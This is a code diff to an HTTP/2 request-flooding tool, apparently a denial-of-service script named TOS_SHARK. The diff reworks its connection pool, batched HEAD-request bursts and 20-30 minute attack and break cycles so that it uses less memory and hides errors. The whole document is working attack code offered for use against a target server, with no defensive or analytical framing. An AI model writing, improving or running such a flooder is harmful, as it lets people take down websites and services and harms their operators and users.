@@ -17,17 +17,18 @@ class TOS_SHARK {
         this.reqCounter = 0;
         this.attackStart = 0;
         this.breakStart = 0;
-        this.currentMethod = 'H2-MULTIPLEX';
-        
-        // Attack methods pool - ONLY H2-MULTIPLEX
-        this.methods = ['H2-MULTIPLEX'];
         
         // Data pools
-        this.userAgents = this.generateUserAgents();
+        this.userAgents = [
+            'Mozilla/5.0',
+            'Chrome/120.0.0.0',
+            'Safari/537.36'
+        ];
         
-        // 7 HTTP/2 connections pool
+        // Connections
         this.connections = [];
         this.maxConnections = 7;
+        this.requestsPerConnection = 125;
         
         // Color codes
         this.colors = {
@@ -39,192 +40,200 @@ class TOS_SHARK {
             yellow: '\x1b[93m'
         };
         
-        this.startCycle();
+        // No GC, no memory-intensive objects
+        this.start();
     }
 
-    // ===== DATA GENERATORS =====
-    generateUserAgents() {
-        return [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
-            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
-        ];
-    }
-
-    // ===== CYCLE MANAGEMENT =====
-    async startCycle() {
-        // Step 1: Create 7 HTTP/2 connections
+    async start() {
         this.createConnections();
-        
-        // Step 2: Main attack loop
-        this.attackLoop();
+        this.mainLoop();
     }
 
     createConnections() {
         for (let i = 0; i < this.maxConnections; i++) {
             try {
-                const client = http2.connect(this.target);
-                this.connections.push(client);
+                const client = http2.connect(this.target, {
+                    maxSessionMemory: 1024 * 1024, // 1MB max memory per session
+                    maxDeflateDynamicTableSize: 4096,
+                    maxHeaderListPairs: 128,
+                    maxOutstandingPings: 2,
+                    maxSendHeaderBlockLength: 16384
+                });
                 
-                // Handle connection errors
-                client.on('error', () => {
-                    setTimeout(() => {
-                        const idx = this.connections.indexOf(client);
-                        if (idx !== -1) {
-                            try { client.destroy(); } catch(e) {}
-                            try {
-                                const newClient = http2.connect(this.target);
-                                this.connections[idx] = newClient;
-                            } catch(e) {}
-                        }
-                    }, 1000);
+                // Minimal error handling
+                client.on('error', (e) => {});
+                client.on('goaway', () => {});
+                client.on('frameError', () => {});
+                
+                this.connections.push({
+                    client: client,
+                    healthy: true
                 });
             } catch (err) {}
         }
     }
 
-    async attackLoop() {
+    async mainLoop() {
+        let batchCounter = 0;
+        
         while (this.running) {
             const now = Date.now();
             
+            // Simple attack/break cycle (no complex timing objects)
             if (this.attackActive) {
-                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
-                    this.startBreak();
+                // Attack for 20-30 minutes
+                if (!this.attackStart) this.attackStart = now;
+                if (now - this.attackStart >= (20 + Math.random() * 10) * 60000) {
+                    this.attackActive = false;
+                    this.attackStart = 0;
+                    this.breakStart = now;
+                    this.cleanupConnections();
                     continue;
                 }
                 
-                await this.attackH2Multiplex();
+                // Send requests in controlled batches
+                if (batchCounter % 10 === 0) {
+                    await this.sendBatch();
+                }
+                batchCounter++;
                 
             } else {
-                if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
-                    this.startAttack();
+                // Break for 20-30 minutes
+                if (!this.breakStart) this.breakStart = now;
+                if (now - this.breakStart >= (20 + Math.random() * 10) * 60000) {
+                    this.attackActive = true;
+                    this.breakStart = 0;
+                    this.createConnections();
                     continue;
                 }
                 
-                await this.performMaintenance();
-                await this.sleepRandom(1000, 3000);
+                // Minimal sleep during break
+                await this.sleep(100);
             }
             
-            await this.sleepRandom(0.1, 1);
-        }
-    }
-
-    startAttack() {
-        this.attackActive = true;
-        this.attackStart = Date.now();
-    }
-
-    startBreak() {
-        this.attackActive = false;
-        this.breakStart = Date.now();
-        this.cleanupConnections();
-    }
-
-    // ===== ATTACK METHOD =====
-    async attackH2Multiplex() {
-        for (const client of this.connections) {
-            if (client && !client.destroyed && client.socket && !client.socket.destroyed) {
-                for (let i = 0; i < 125; i++) {
-                    this.sendH2HeadRequest(client);
-                    this.totalReqs++;
-                    this.reqCounter++;
-                }
+            // Small delay between loops (prevents event loop congestion)
+            if (batchCounter % 100 === 0) {
+                await this.sleep(1);
             }
         }
     }
 
-    sendH2HeadRequest(client) {
+    async sendBatch() {
+        // Use setTimeout for non-blocking async
+        return new Promise((resolve) => {
+            setTimeout(() => {
+                let sent = 0;
+                
+                for (const conn of this.connections) {
+                    if (conn.healthy && conn.client && !conn.client.destroyed) {
+                        // Send 125 requests per connection
+                        for (let i = 0; i < this.requestsPerConnection; i++) {
+                            this.sendHeadRequest(conn.client);
+                            this.totalReqs++;
+                            this.reqCounter++;
+                            sent++;
+                            
+                            // Spread out requests slightly
+                            if (i % 25 === 0) {
+                                // Yield to event loop
+                                setImmediate(() => {});
+                            }
+                        }
+                    }
+                }
+                
+                // Log every 10 seconds
+                if (Date.now() - this.lastLog >= 10000) {
+                    this.lastLog = Date.now();
+                    this.logStatus(200); // Default status for batch
+                }
+                
+                resolve();
+            }, 0); // Non-blocking
+        });
+    }
+
+    sendHeadRequest(client) {
+        // Minimal request creation
         try {
             const req = client.request({
                 ':method': 'HEAD',
                 ':path': '/',
-                ':authority': this.host,
-                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
+                ':authority': this.host
+            }, {
+                endStream: true
             });
             
+            // Minimal response handler
             req.on('response', (headers) => {
-                this.logStatus(headers[':status']);
-                req.destroy();
+                const status = headers[':status'];
+                // Store last status for logging
+                this.lastStatus = status;
+                req.close();
             });
             
             req.on('error', () => {
-                this.logStatus('*.*');
-                req.destroy();
+                req.close();
             });
             
             req.end();
         } catch (err) {
-            this.logStatus('*.*');
+            // Ignore errors
         }
-    }
-
-    // ===== MAINTENANCE =====
-    async performMaintenance() {
-        if (global.gc) global.gc();
-        this.userAgents = this.generateUserAgents();
-        this.cleanupConnections();
-        this.createConnections();
     }
 
     cleanupConnections() {
-        for (const client of this.connections) {
+        // Clean up without creating garbage
+        for (const conn of this.connections) {
             try {
-                if (client && !client.destroyed) {
-                    client.destroy();
+                if (conn.client && !conn.client.destroyed) {
+                    conn.client.close();
                 }
             } catch (e) {}
         }
-        this.connections = [];
+        this.connections.length = 0; // Clear array without new allocation
     }
 
-    // ===== LOGGING WITH COLOR CODING =====
     logStatus(status) {
-        const now = Date.now();
-        if (now - this.lastLog >= 10000) {
-            this.lastLog = now;
-            
-            // Format: TØR-2M11 = darkMagenta, totalReqs = darkGreen
-            const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
-            
-            // Status code color logic
-            let statusColor = this.colors.green; // Default for 2xx
-            let statusText = status;
-            
-            if (status === '*.*') {
+        // Format: TØR-2M11 = darkMagenta, totalReqs = darkGreen
+        const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
+        
+        // Status code color logic
+        let statusColor = this.colors.green;
+        let statusText = status === '*.*' ? '*.*' : (this.lastStatus || 200);
+        
+        if (statusText === '*.*') {
+            statusColor = this.colors.red;
+        } else if (typeof statusText === 'number') {
+            if (statusText >= 500) {
                 statusColor = this.colors.red;
-                statusText = '*.*';
-            } else if (typeof status === 'number') {
-                if (status >= 500) {
-                    // 5xx - Red
-                    statusColor = this.colors.red;
-                } else if (status >= 400) {
-                    // 4xx - Red (including 403)
-                    statusColor = this.colors.red;
-                } else if (status >= 300) {
-                    // 3xx - Yellow (for 3xx redirects)
-                    statusColor = this.colors.yellow;
-                } else if (status >= 200) {
-                    // 2xx - Green
-                    statusColor = this.colors.green;
-                }
+            } else if (statusText >= 400) {
+                statusColor = this.colors.red;
+            } else if (statusText >= 300) {
+                statusColor = this.colors.yellow;
+            } else if (statusText >= 200) {
+                statusColor = this.colors.green;
             }
-            
-            // Output with color coding
-            console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
         }
+        
+        console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
     }
 
-    // ===== UTILS =====
-    sleepRandom(min, max) {
-        const duration = Math.random() * (max - min) + min;
-        return new Promise(resolve => setTimeout(resolve, duration));
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
 }
 
-// Run
+// Run with increased memory limit and no GC
 if (require.main === module) {
+    // Increase heap memory
+    require('v8').setFlagsFromString('--max-old-space-size=4096');
+    
+    // Disable verbose errors
+    process.removeAllListeners('uncaughtException');
+    process.removeAllListeners('unhandledRejection');
+    
+    // Minimal error handling
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
     
